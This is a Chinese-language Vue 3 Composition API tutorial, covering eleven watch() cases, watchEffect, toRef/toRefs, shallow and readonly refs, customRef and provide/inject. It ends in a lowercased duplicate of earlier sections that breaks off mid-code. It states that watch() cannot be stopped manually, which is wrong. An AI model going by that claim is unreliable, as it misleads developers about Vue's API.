watch()的十一种情况\n\n说实话Vue3的watch()比较难玩，它在功效上和Vue2的watch几乎一样，只是在用法上变化很大，情况会比较复杂。原因一是ref和reactive，原因二是watch()扩展了参数的写法。\n\n我们看一下watch()扩展参数的写法，wathc(数据, 回调函数)，这个“数据”有三种写法\n\n * 直接写ref对象或者reactive对象；\n * () => state.xxx，例如这种getter函数（getter/effect）；\n * [xxx, yyy]，例如这种数据列表（数组）。\n\n我们看下面演示的例子：\n\n<template>\n  <div><span>数值: {{count}}</span> || <button type=\"button\" @click=\"handleClick1\">点我</button></div>\n  <div><span>名字: {{lastName+firstName}}</span> || <button type=\"button\" @click=\"handleClick2\">点我</button></div>\n  \n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\n// 情况一：直接侦听ref\nconst count = ref(0)\nwatch(count, (count, prevCount) => {\n  console.log('直接侦听ref。 count', count, ', prevCount: ', prevCount);\n})\n\n// 情况二：侦听一个getter（ref），注意count此时要带上.value\nwatch(() => count.value, (count, prevCount) => {\n    console.log('侦听一个getter。 count: ', count, ', prevCount: ', prevCount);\n  }\n)\n// 情况三：侦听一组ref\nconst firstName = ref('三')\nconst lastName = ref('张')\nwatch(\n  [firstName, lastName],\n  (newValues, prevValue) => {\n    console.log('名字改变了, newValues: ', newValues, ', prevValue: ', prevValue);\n  }\n)\nconst handleClick1 = () => { count.value++; }\nconst handleClick2 = () => { firstName.value += '?'; lastName.value += '!' }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n * 情况一，直接侦听一个ref，常用于侦听基本类型的响应式数据，不用带上.value。\n * 情况二，侦听一个getter（ref），一般用于侦听ref的value。不太常用，一般直接用情况一就行了，不要多此一举。\n * 情况三，侦听一组ref，它们都不用带上.value，多个同时被修改，也只触发一次回调。\n\n以上三种情况还只是基本类型，也就是ref对象。如果涉及到复杂类型，又要分为ref对象和reactive对象，虽然不太推荐用ref()为对象创建响应式数据，但官方并没有对此做出约束。看一下演示例子。\n\n<template>\n  <div>\n    <span>person1: {{person1.name}} - {{person1.age}} - {{person1.mother.name}} - {{person1.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleClick1\">点我1</button> || \n    <button type=\"button\" @click=\"handleClick2\">点我2</button>\n  </div>\n  <div>\n    <span>person2: {{person2.name}} - {{person2.age}} - {{person2.mother.name}} - {{person2.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleClick3\">点我3</button> || \n    <button type=\"button\" @click=\"handleClick4\">点我4</button>\n  </div>\n  <div>\n    <span>obj1.a: {{obj1.a}} - obj1.b.c: {{obj1.b.c}}</span> || \n    <button type=\"button\" @click=\"handleClick5\">点我5</button> || \n    <button type=\"button\" @click=\"handleClick6\">点我6</button>\n  </div>\n  <div>\n    <span>obj2.d: {{obj2.d}} - obj2.e.f: {{obj2.e.f}}</span> || \n    <button type=\"button\" @click=\"handleClick7\">点我7</button> || \n    <button type=\"button\" @click=\"handleClick8\">点我8</button>\n  </div>\n</template>\n\n<script setup>\nimport { reactive, watch } from 'vue'\n\nconst person1 = reactive({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\n// 情况四：侦听一个reactive\nwatch(person1, (newValues, prevValue) => {\n    console.log('侦听一个reactive。 newValues: ', newValues, ', prevValue: ', prevValue);\n  }\n)\nconst person2 = reactive({\n  name: '李四',\n  age: 19,\n  mother: {name:'王雪',age: 39}\n})\n// 情况五：侦听一个getter（reactive）\nwatch(() => person2.age, (newValues, prevValue) => {\n    console.log('侦听一个getter（reactive）。 newValues: ', newValues, ', prevValue: ', prevValue);\n  }\n)\nconst obj1 = reactive({a: 'a', b: {c: 'c'}});\nconst obj2 = reactive({d: 'd', e: {f: 'f'}})\n// 情况六：侦听一组reactive\nwatch([obj1, obj2], (newValues, prevValue) => {\n    console.log('侦听一组reactive。 newValues: ', newValues, ', prevValue: ', prevValue);\n  }\n)\nconst handleClick1 = () => { person1.age++; }\nconst handleClick2 = () => { person1.mother.age++; }\nconst handleClick3 = () => { person2.age++; }\nconst handleClick4 = () => { person2.mother.age++; }\nconst handleClick5 = () => { obj1.a+='a'; }\nconst handleClick6 = () => { obj1.b.c+='c'; }\nconst handleClick7 = () => { obj2.d+='d'; }\nconst handleClick8 = () => { obj2.e.f+='f'; }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n * 情况四，直接侦听一个reactive，不管修改层次有多深的属性，它都能侦听到。\n * 情况五，侦听一个getter（reactive），一般用于侦听reactive对象的某个属性，这种很常见了。\n * 情况六，侦听一组reactive，类似情况四，它们其实有一个小问题。\n\n情况四和情况六有个小问题，那就是回调函数里的newValues, prevValue两对象一直是同一个，你想要前一份状态值需要做一下优化。需要先深克隆一下源响应式对象，然后用getter返回这个新对象，情况七如下。\n\n<template>\n  <div>\n    <span>obj1.a: {{obj1.a}} - obj1.b.c: {{obj1.b.c}}</span> || \n    <button type=\"button\" @click=\"handleClick5\">点我5</button> || \n    <button type=\"button\" @click=\"handleClick6\">点我6</button>\n  </div>\n  <div>\n    <span>obj2.d: {{obj2.d}} - obj2.e.f: {{obj2.e.f}}</span> || \n    <button type=\"button\" @click=\"handleClick7\">点我7</button> || \n    <button type=\"button\" @click=\"handleClick8\">点我8</button>\n  </div>\n</template>\n\n<script setup>\nimport { reactive, watch } from 'vue'\n// yarn add lodash@4\nimport cloneDeep from 'lodash/cloneDeep';\n\nconst obj1 = reactive({a: 'a', b: {c: 'c'}});\nconst obj2 = reactive({d: 'd', e: {f: 'f'}})\n// 情况七：侦听一组reactive，如果是person的话就是 () => cloneDeep(person)\nwatch(() => [cloneDeep(obj1), cloneDeep(obj2)], (newValues, prevValue) => {\n    console.log('侦听一组reactive。 newValues: ', newValues, ', prevValue: ', prevValue);\n  }\n)\nconst handleClick5 = () => { obj1.a+='a'; }\nconst handleClick6 = () => { obj1.b.c+='c'; }\nconst handleClick7 = () => { obj2.d+='d'; }\nconst handleClick8 = () => { obj2.e.f+='f'; }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n然后就是用ref()为对象创建响应式数据，在侦听它时，要么使用.value，要么就配上{ deep: true }，情况八如下。\n\n<template>\n  <div>\n    <span>person: {{person.name}} - {{person.age}} - {{person.mother.name}} - {{person.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleClick1\">点我1</button> || \n    <button type=\"button\" @click=\"handleClick2\">点我2</button>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\nconst person = ref({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\n// 情况八：侦听一个“用ref()为对象创建响应式数据”。要么person.value，要么person + { deep: true }\nwatch(person, (newValues, prevValue) => {\n    console.log('侦听。 newValues: ', newValues, ', prevValue: ', prevValue);\n  }, { deep: true }\n)\nconst handleClick1 = () => { person.value.age++; }\nconst handleClick2 = () => { person.value.mother.age++; }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\ngetter的注意事项，其实看到这里可以跳过了，下面的情况很少见。上面的情况二里的getter是用于ref的value上的，上面的情况五里的getter是用于reactive的某层里某个属性的，上面的情况七里的getter是用于cloneDeep后的对象。而如果getter直接用于ref或reactive对象本身的话，必须得配合{ deep: true }，这与上面的情况八是同样的道理，情况九、十、十一演示如下。\n\n<template>\n  <div><span>数值: {{count}}</span> || <button type=\"button\" @click=\"handleClick1\">点我1</button></div>\n  <div>\n    <span>person1: {{person1.name}} - {{person1.age}} - {{person1.mother.name}} - {{person1.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleClick2\">点我2</button> || \n    <button type=\"button\" @click=\"handleClick3\">点我3</button>\n  </div>\n  <div>\n    <span>person2: {{person2.name}} - {{person2.age}} - {{person2.mother.name}} - {{person2.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleClick4\">点我4</button> || \n    <button type=\"button\" @click=\"handleClick5\">点我5</button>\n  </div>\n</template>\n\n<script setup>\nimport { ref, reactive, watch } from 'vue'\n\nconst count = ref(0)\n// 情况九：侦听一个getter（ref），count没有带上.value，并且使用了deep: true\nwatch(() => count, (count, prevCount) => {\n    console.log('侦听一个getter（ref）。 count: ', count, ', prevCount: ', prevCount);\n  }, {deep: true}\n)\nconst person1 = reactive({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\n// 情况十：侦听一个getter（reactive），count没有带上.value，并且使用了deep: true\nwatch(() => person1, (newValues, prevValue) => {\n    console.log('侦听一个getter（reactive）。 newValues: ', newValues, ', prevValue: ', prevValue);\n  }, {deep: true}\n)\nconst person2 = ref({\n  name: '李四',\n  age: 19,\n  mother: {name:'王雪',age: 39}\n})\n// 情况十一：侦听一个getter（ref-对象），count没有带上.value，并且使用了deep: true\nwatch(() => person2, (newValues, prevValue) => {\n    console.log('侦听一个getter（reactive）。 newValues: ', newValues, ', prevValue: ', prevValue);\n  }, {deep: true}\n)\nconst handleClick1 = () => { count.value++; }\nconst handleClick2 = () => { person1.age++; }\nconst handleClick3 = () => { person1.mother.age++; }\nconst handleClick4 = () => { person2.value.age++; }\nconst handleClick5 = () => { person2.value.mother.age++; }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\n情况九、十、十一，getter里直接返回一个ref对象或者reactive本身，一般是需要开启{deep: true}。这三种情况比较少见，因为用前面的情况可以替代，这里只是作为陷阱来讲的。\n\n总结一下watch()的用法：\n\n * 如果侦听的响应式数据是基本类型，那么watch()的第一个形参直接用ref对象本身就可以了，也就是情况一。（如果你非要.value那就搭配getter用法，也就是情况二）。\n * 如果侦听的响应式数据是复杂类型整体，那么watch()的第一个形参直接用reactive对象本身就可以了（它相当于自动开启了{deep:true}，如果你尝试手动用{deep:false}这是关闭不了的），也就是情况四。\n * 如果侦听的响应式数据是复杂类型的某个属性，那么watch()的第一个形参用getter配合reactive对象即可，也就是情况五。\n * 如果侦听的响应式数据是复杂类型整体并且还想知道它前一次的状态值，那么就需要getter配合reactive对象的深克隆对象，也就是情况七。\n * 如果想一次性侦听多个，那么watch()的第一个形参是一个数组，数组每一项最好是ref对象或者reactive对象或者reactive对象的克隆对象，具体情况看前面的描述。这一条是情况三和情况六\n * 至于其他情况，也就是情况八、九、十、十一或者其他衍生出来的情况，它们都能用前面的方式进行替代或者优化。\n\n\n# watchEffect()\n\n其实上一节的watch()更像React的useEffect()。\n\nwatchEffect()和watch()是同一个功能的两种不同形态，底层的实现是一样的，大致区别如下\n\n * watch()：\n   * 显式指定依赖源（手动指定），依赖源更新时执行回调函数。\n   * 不过它是惰性的，多个依赖源修改时，一般只触发一次回调函数（用nextTick可以多次）。\n   * 可以立即执行回调函数，但必须手动加上{immediate: true}。\n * watchEffect()：\n   * 自动收集依赖源（不用手动指定依赖项），依赖源更新时重新执行自身。\n   * 多个依赖源修改时，有几次修改就调用几次。\n   * 并且回调函数是立即执行，相当于{immediate: true}（不用手动加）。\n   * 在组件卸载时自动停止侦听，不仅如此还能手动停止。\n   * 还能使用清除函数（失效回调），在卸载时执行一次清除函数，也在副作用即将重新执行时调用一次清除函数（这个和React的useEffect返回一个清除函数很像，只不过Vue3不是返回，而是形参）。\n   * 最后还能将回调函数调整到组件更新后再执行，需要在watchEffect()的第二个参数上写{flush: 'post'}（默认是{flush: 'pre'}也就是update前执行的），像React就不能调整，它是默认updated后执行。\n\n具体讲解如下（就理解为watch和watchEffect是React的useEffect拆分出来的两个功能把）：\n\n 1. watchEffect()依赖源的收集，以及回调函数的立即执行代码如下。\n    \n    watchEffect(\n      // 回调函数默认立即执行一次\n      () => console.log(counter.value) // 这里就是依赖项counter，但是是Vue3自动帮你收集的\n    )\n    // 与上面的基本等价\n    watch(\n      () => counter.value, // 这里手动指定依赖是counter\n      () => console.log(counter.value), \n      { immediate: true } // 如果要立即执行一次，必须手动指定{ immediate: true }\n    )\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 2. 多个依赖源修改时，watchEffect()与watch()的区别。推荐在大部分时候用watch()显式的指定依赖以避免不必要的重复触发，也避免在后续代码修改或重构时不小心引入新的依赖。\n    \n    const counter = ref(0)\n    const enabled = ref(false)\n    \n    watchEffect(() => {\n      if (enabled.value)\n        console.log(counter.value)\n    })\n    \n    // (以下忽略 nextTick)\n    \n    // watchEffect 会被立即执行，因为 “enabled“ 为 false, 此时仅收集到 “enabled“ 依赖\n    counter.value += 1 // 无反应\n    \n    enabled.value = true // Effect 触发，控制台出 \"1\"\n    counter.value += 1 // “counter“ 被作为新的依赖被收集，控制台出 \"2\"\n    \n    enabled.value = false // 函数被重新执行，无输出\n    counter.value += 1 // 函数被重新执行，无输出 (虽然 counter 已经没有用了，但是作为依赖还是会触发函数）\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n\n 3. watchEffect()组件卸载时自动停止侦听，也能手动停止。watch()做不到手动停止，watchEffect()的这种场景用的比较少。\n    \n    const stop = watchEffect(() => {\n      /* ... */\n    })\n    \n    // later\n    stop()\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 4. watchEffect()清除函数（失效回调）的使用场景。onInvalidate是watchEffect()的形参，而onInvalidate的入参就是我们声明的一个清除函数（失效回调），它会在组件卸载前执行一次，也会在副作用每次执行前调用一次，这就能保证先取消订阅后更新订阅。（这个和React的useEffectreturn一个清除函数很像，只不过Vue3里不是return，而是形参）\n\nimport { reactive, watch, watchEffect } from 'vue'\nconst friend = reactive({id:1});\nlet prevFriendId = friend.id;\nwatch(() => friend.id, (newValue, prevValue) => {\n  prevFriendId = prevValue;\n})\n// 唯一不方便的就是旧值得额外用prevFriendId存储。如果只用watch()，那就还需要onUnmounted()钩子（vue2的beforeDestroy）\nwatchEffect(onInvalidate => {\n  ChatAPI.subscribeToFriendStatus(\n    friend.id,\n    handleStatusChange\n  );\n  // 除了这种场景，也可用来清除（中断）上一次请求，source.cancel('trigger')\n  onInvalidate(() => {\n    ChatAPI.unsubscribeFromFriendStatus(\n      prevFriendId,\n      handleStatusChange\n    );\n  })\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# Vue3的生命周期钩子\n\n\n\n选项式 API           HOOK INSIDE SETUP\nbeforeCreate      Not needed*\ncreated           Not needed*\nbeforeMount       onBeforeMount\nmounted           onMounted\nbeforeUpdate      onBeforeUpdate\nupdated           onUpdated\nbeforeUnmount     onBeforeUnmount\nunmounted         onUnmounted\nerrorCaptured     onErrorCaptured\nrenderTracked     onRenderTracked\nrenderTriggered   onRenderTriggered\nactivated         onActivated\ndeactivated       onDeactivated\n\nNot newded*：因为setup是围绕beforeCreate和created生命周期钩子运行的，所以不需要显式地定义它们。换句话说，在这些钩子中编写的任何代码都应该直接在setup函数中编写。\n\n\n# toRef()和toRefs()\n\ntoRef()创建一个ref对象，它的value值是另一个响应式对象的某个property属性。这个创建出来的re对象会保持对其源 property 的响应式连接。toRef()用的最多的是，将某个属性单独传递给外部，自定义Hooks中用的多。\n\nconst state = reactive({\n  foo: 1,\n  bar: 2\n})\n// 第一个参数是源响应式对象，第二个参数是属性名\nconst fooRef = toRef(state, 'foo')\n\n// fooRef和state.foo的响应式连接一直存在\nfooRef.value++\nconsole.log(state.foo) // 2\n\n// fooRef和state.foo的响应式连接一直存在\nstate.foo++\nconsole.log(fooRef.value) // 3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ntoRef()是处理单个，而toRefs()是处理源响应式对象所有的第一层属性。\n\nconst state = reactive({\n  foo: 1,\n  bar: 2\n})\nconst { foo, bar } = toRefs(state) // 在自定义hooks中用的特别多，可以只返回一部分响应式的数据\n\n// ref 和原始 property 已经“链接”起来了\nstate.foo++\nconsole.log(foo.value) // 2\n\nfoo.value++\nconsole.log(state.foo) // 3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 自定义hook\n\n自定义hook在React中非常常见，Vue3中初次使用会比较陌生，但其实很简单，看下面这个例子。\n\nimport { reactive, onMounted, onUnmounted } from 'vue';\n// 自定义hook，点击时获取坐标\nexport const usePoint = () => {\n    const point = reactive({\n        x: 0,\n        y: 0\n    });\n    const savePoint = (e) => {\n        point.x = e.pageX;\n        point.y = e.pageY;\n        console.log('point:', point.x, point.y);\n    }\n    onMounted(() => {\n        window.addEventListener('click', savePoint);\n    });\n    onUnmounted(() => {\n        window.removeEventListener('click', savePoint);\n    });\n    // 最后返回有效数据\n    return point;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<template>\n  <div>\n    <span>{{point.x}}, {{point.y}}</span>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watchEffect } from 'vue'\nimport { usePoint } from './hook.js'\n// 使用自定义钩子\nconst point = usePoint();\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 其他Composition API\n\n\n# shallowReactive()和shallowRef()\n\nshallow的意思是“浅的”，shallowReactive()和shallowRef()会生成浅响应式数据。对于shallowReactive()，它的“浅”表示只让reactive对象的第一层属性具有响应式。\n\n<template>\n  <div>\n    <span>person: {{person.name}} - {{person.age}} - {{person.mother.name}} - {{person.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleClick1\">点我1</button> || \n    <button type=\"button\" @click=\"handleClick2\">点我2</button>\n  </div>\n</template>\n\n<script setup>\nimport { shallowReactive } from 'vue'\n\nconst person = shallowReactive({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\nconst handleClick1 = () => { person.age++; } // 页面正常更新\nconst handleClick2 = () => { person.mother.age++; } // 页面没反应\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n对于shallowRef()，它的“浅”表示只让ref对象的value本身这个值具有响应式。基本类型的场景，.value就是基本类型的值（数值、布尔值、字符串）；而复杂类型场景，.value是一个指向对象的地址值，指向的这个对象并不是Proxy类型，也就是说.value它指向的对象不再具有响应式。\n\n<template>\n  <div>\n    <span>person: {{person.name}} - {{person.age}} - {{person.mother.name}} - {{person.mother.age}}</span> || \n    <button type=\"button\" @click=\"handleClick1\">点我1</button> || \n    <button type=\"button\" @click=\"handleClick2\">点我2</button>\n  </div>\n</template>\n\n<script setup>\nimport { shallowRef } from 'vue'\n\nconst person = shallowRef({\n  name: '张三',\n  age: 18,\n  mother: {name:'李梅',age: 42}\n})\nconst handleClick1 = () => { person.value.age++; } // 修改对象里面的某些属性，页面没反应\nconst handleClick2 = () => {\n  // 将value指向的对象完全替换成新的，页面响应了\n  person.value = {\n    name: '李四',\n    age: 19,\n    mother: {name:'王雪',age: 39}\n  }; \n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n最后说一下，shallowRef()，ref对象的.value一直是一个值，可以是基本类型数据的值，也可以是一个对象的地址值，只要修改值那就是响应式的，如果是修改.value指向的对象里的某些属性那就不会响应。修改对象地址值就是替换一个新对象，这与修改对象的某些属性并不一样，也就是“浅”的表现之处。shallowRef()与ref()的区别就是.value指向的对象一个是普通对象类型，另一个是Proxy类型的。\n\n\n# readonly()和shallowReadonly()\n\nreadonly()返回原始对象的只读代理，这个原始对象可以是普通对象、ref对象或reactive对象。不允许修改对象里的属性值。而shallowReadonly()是只限制对象第一层属性不允许被修改，其他深层次的是可以被修改的。经常用于做数据隔离，如果强制修改会在控制台还有警告提示，比如拖拽表格并且表格里有input等输入表单项。\n\nconst original = reactive({ count: 0 })\n\nconst copy = readonly(original)\n\nwatchEffect(() => {\n  // 用于响应性追踪\n  console.log(copy.count)\n})\n\n// 变更 original 会触发依赖于副本的侦听器\noriginal.count++\n\n// 变更副本将失败并导致警告\ncopy.count++ // 警告!\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# toRaw()和markRaw()\n\ntoRaw()返回reactive()或readonly()代理的原始对象。请谨慎使用toRaw()，它直接操作原始对象，虽然在一定程度上避开了“响应”，但意外修改它可能会引起BUG。\n\nconst foo = {}\nconst reactiveFoo = reactive(foo)\nconsole.log(toRaw(reactiveFoo) === foo) // true\n\n\n1\n2\n3\n\n\nmarkRaw()标记一个对象，使其永远不会转换为 proxy（不会被用于响应式），最后返回对象本身。markRaw()常用于标记一些第三方类库引用对象，或者用于不可变数据的大列表，也就说一些对象是没必要进行响应式proxy处理的，可防止开发人员意外设置它们为响应式。\n\nconst foo = markRaw({})\n// isReactive()：检查对象是否是由reactive()创建的响应式数据\nconsole.log(isReactive(reactive(foo))) // false\n\n// 嵌套在其他响应式对象中\nconst bar = reactive({ foo })\nconsole.log(isReactive(bar.foo)) // false\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# customRef()\n\ncustomRef()用于创建一个自定义的ref对象，可以在ref.value设置值（setter）和读取值（getter）时加入自定义逻辑。customRef()的入参是一个函数，该函数有两个形参，第一个形参track在getter内部用于“放行”（其实是添加effect），第二形参trigger在setter内部用于“放行”（其实是触发effect），函数返回一个对象，该对象有get和set属性（getter和setter）。一个延迟显示的例子如下：\n\n<template>\n  <div>\n    <input v-model=\"inputValue\" /><span>{{delayShow}}</span>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watchEffect } from 'vue'\n\n// 输入框里的值\nconst inputValue = ref(0);\n\n// 输入框后面的span展示值，要求是隔一秒再更新，这个防抖函数可以封装成一个自定义hook\nconst delayShow = useDebouncedRef(inputValue.value, 1000)\n\nwatchEffect(() => {\n  delayShow.value = inputValue.value;\n});\n<\/script>\n\n<script>\nimport { customRef } from 'vue'\n// 自定义hook\nfunction useDebouncedRef(value, delay = 200) {\n  let timeout\n  return customRef((track, trigger) => {\n    return {\n      get() {\n        track()\n        return value\n      },\n      set(newValue) {\n        clearTimeout(timeout)\n        timeout = setTimeout(() => {\n          value = newValue\n          trigger()\n        }, delay)\n      }\n    }\n  })\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# triggerRef()\n\n手动执行与shallowRef关联的任何作用 (effect)。\n\nconst shallow = shallowRef({\n  greet: 'Hello, world'\n})\n\n// 第一次运行时记录一次 \"Hello, world\"\nwatchEffect(() => {\n  console.log(shallow.value.greet)\n})\n\n// 这不会触发作用 (effect)，因为 ref 是浅层的\nshallow.value.greet = 'Hello, universe'\n\n// 记录 \"Hello, universe\"，意思是会执行watchEffect里的回调函数\ntriggerRef(shallow)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# provide()和inject()\n\n和vue2的provide/inject功效差不多，可以传响应式数据并且数据更安全了，比如可以用readonly()对数据进行限制（或者shallowRef等）。\n\n<template>\n  <MyMarker />\n</template>\n\n<script setup>\nimport { ref, reactive, readonly, provide } from 'vue'\nimport MyMarker from './MyMarker.vue'\nconst location = ref('North Pole')\nconst geolocation = reactive({\n  longitude: 90,\n  latitude: 135\n})\n// 修改location的方法\nconst updateLocation = () => {\n  location.value = 'South Pole'\n}\n// 将孙组件想要的location和geolocation传递过去，传递是我们用readonly做\n// 限制，不允许直接修改数据源，只允许使用传递的updateLocation方法进行修改\nprovide('location', readonly(location))\nprovide('geolocation', readonly(geolocation))\nprovide('updateLocation', updateLocation)\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n<template>\n    <div>\n        <div>location: {{userLocation}}</div>\n        <div>longitude: {{userGeolocation.longitude}}</div>\n        <div>latitude: {{userGeolocation.latitude}}</div>\n        <button @click=\"updateUserLocation\">点我</button>\n    </div>\n</template>\n\n<script>\nimport { inject } from 'vue'\n\nexport default {\n  setup() {\n    // 接收祖先节点的provide，第二个参数是默认值\n    const userLocation = inject('location', 'The Universe')\n    const userGeolocation = inject('geolocation')\n    const updateUserLocation = inject('updateLocation')\n\n    return {\n      userLocation,\n      userGeolocation,\n      updateUserLocation\n    }\n  }\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# isRef、isReactive、isReadonly、isProxy、unref\n\n响应式数据判断：\n\n * isRef()：检查一个值是否是一个ref对象。\n * isReactive()：检查一个对象是否由reactive()创建的代理。\n * isReadonly()：检查一个对象是否由readonly()创建的只读代理。\n * isProxy()：检查一个对象是否由reactive或者readonly创建的代理。\n * unref()：是val = isRef(val) ? val.value : val的语法糖函数。unref中的r确实是小写。",normalizedContent:"# vue3\n\n\n# 用vite初始化项目\n\n先创建项目\n\n// 全局安装yarn（有就跳过，或者你想用npm）\nnpm install --global yarn\n// 使用yarn和vite创建项目my-vue-app\nyarn create vite my-vue-app --template vue\n// npm方式\nnpm init vite@latest my-vue-app -- --template vue\n\n\n1\n2\n3\n4\n5\n6\n\n\n然后使用npm install或者yarn下载项目的依赖包，最后可以看一下package.json里的scripts，运行npm run dev启动项目。\n\n{\n  \"scripts\": {\n    \"dev\": \"vite\", // 启动开发服务器，别名：`vite dev`，`vite serve`\n    \"build\": \"vite build\", // 为生产环境构建产物\n    \"preview\": \"vite preview\" // 本地预览生产构建产物\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n到谷歌网上应用商店安装vue.js devtools，图标里带个“beta”的是vue3的开发者工具。右击“管理扩展程序”，选择“允许访问文件网址”。\n\n走读一些文件：\n\n * index.html放在了根目录了，这个是由vite决定的，本地开发时index.html作为入口，根据它里面的<script type=\"module\" src=\"...\">来动态解析模块。他是先启动服务后动态解析模块，而webpack是先解析模块后启动服务。\n * main.js里最大改变是createapp，而vue2是new vue()（而且vue已经引不进来了，只能使用createapp）。这个createapp是个工厂函数，用于创建应用实例。它的入参和new vue()的入参一样是组件选项对象，但是它创建出来的实例很“轻”，你可以console.log打印一下实例。\n * app.vue，这<template>里不再约束只能有一个根节点，现在可以看到它有同级的<img>和<helloworld>。\n\n\n# 常用的composition api\n\n\n# setup()和script setup\n\ncomposition api意思是组合式api，以前vue2是options api配置化api，在vue3初期版本还是存在配置项+composition api写法的，这是为了让开发者能平稳过渡。\n\nsetup是一个函数，在组件选项对象属于一个新的配置项，与name等配置是同级的。它用于承载其他的composition api，组件中所用到的数据、方法、计算属性、监视属性、生命周期等都可以配置在setup里面。\n\n\x3c!-- mybook.vue --\x3e\n<template>\n  <div>{{ msg }}: {{ readersnumber }} || {{ book.title }}</div>\n  <button type=\"button\" @click=\"hello\">点我</button>\n</template>\n\n<script>\n  import { ref, reactive } from 'vue'\n  export default {\n    props: {\n      msg: string\n    },\n    setup(props) {\n      // data里的一些响应式数据\n      const readersnumber = ref(0)\n      const book = reactive({ title: 'vue 3 guide' })\n      // methods里的方法\n      function hello() { alert('hello'); }\n      // 给<template>用的数据，必须return出去\n      return { readersnumber, book, hello }\n    }\n  }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n不过，我本人并不推荐这种半options api半composition api的写法。这些个data、methods要放在setup函数内部，最后还有个return返回一大串数据供template使用（代码过长你可能忘记return了）。它同级还有components、props等，如果你初次接触就会有些迷惑，到底哪些是配置式写法哪些要放到setup里组合起来写（可以两种方法混用，但setup里的更优先），这到底是在写vue2还是在写vue3呢？\n\n我推荐<script setup>的写法（setup作为<script>一个属性），它是在vue3.2时推出的，它的样板代码会少很多，没有了return等（这个return有点像react返回jsx）。但是它需要你额外使用defineprops、computed、usecontext等钩子。如果你学习过react，就会发现它和函数式组件+hooks的方案非常像。\n\n<template>\n  <div>{{ msg }}: {{ readersnumber }} || {{ book.title }}</div>\n  <button type=\"button\" @click=\"hello\">点我</button>\n</template>\n\n<script setup>\nimport { ref, reactive } from 'vue'\n\n// 父组件传来的props数据\ndefineprops({ msg: string })\n// data里的一些响应式数据\nconst readersnumber = ref(0)\nconst book = reactive({ title: 'vue 3 guide' })\n// methods里的方法\nconst hello = () => { alert('hello'); 